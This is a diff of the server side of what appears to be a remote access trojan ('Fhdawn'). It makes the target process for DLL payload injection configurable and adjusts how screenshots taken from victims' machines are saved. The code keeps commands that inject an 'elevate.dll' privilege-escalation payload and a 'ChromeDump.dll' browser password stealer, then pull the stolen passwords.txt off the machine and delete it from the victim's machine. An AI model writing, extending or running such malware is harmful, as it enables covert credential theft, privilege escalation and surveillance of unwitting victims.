@@ -660,13 +660,11 @@ Open Ports
                     self.WaitForReply()
                 elif(main == "elevate"):
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
-                    DLLTransfer("payloads/elevate.dll", "Fhdawn.exe") # Inject elevate.dll in Fhdawn.exe
-                    print( Style.BRIGHT + Fore.CYAN + "[ + ] Payload Output : \n------------------\n" + Style.RESET_ALL)
-                    DLLGetOutput()
+                    DLLTransfer("payloads/elevate.dll", setting('inject_process')) # Inject elevate.dll in Fhdawn.exe
                 
                 elif(main == "chromedump"):
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
-                    DLLTransfer("payloads/ChromeDump.dll", "Fhdawn.exe") # Inject ChromeDump.dll in Fhdawn.exe
+                    DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll in Fhdawn.exe
                     self.SendData("fupload:passwords.txt")
                     time.sleep(2)
                     self.SendData("delete:passwords.txt")
@@ -781,7 +779,7 @@ Open Ports
                         print("[i] Please report this bug to developer with the information above.")
                         pass
                 
-                # Get screenshot, Convert to jpeg and save
+                # Get screenshot, Convert to png and save
                 elif(client_data.startswith("SCREENSHOT")):
                     try:
                         fileinfo = client_data.split(":") #SCREENSHOT:filename.txt:555
@@ -789,7 +787,7 @@ Open Ports
                         filename = hostList[indexof].split("/")[1].replace(" ","") + "-" + fileinfo[1]
                         filesize = int(fileinfo[2])
                         SaveFile = "downloads/"+ filename
-                        FinalF = uniquify(SaveFile)
+                        FinalF = uniquify(SaveFile).replace("bmp", "png")
 
                         with open(FinalF, "wb") as incoming_file:
                             data = self.client_socket.recv(4096)
@@ -800,9 +798,9 @@ Open Ports
                                 #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                 if not data: break
                             incoming_file.write(data)
-
-                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
-                        showImage(FinalF) # Don't do school, Stay in drugs
+                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
+                            saveAndShowImage(FinalF) 
+                                  
                     except Exception as e:
                         print("[X] Error : " + str(e))
                         print("[i] Screenshot Download Information : " + client_data)
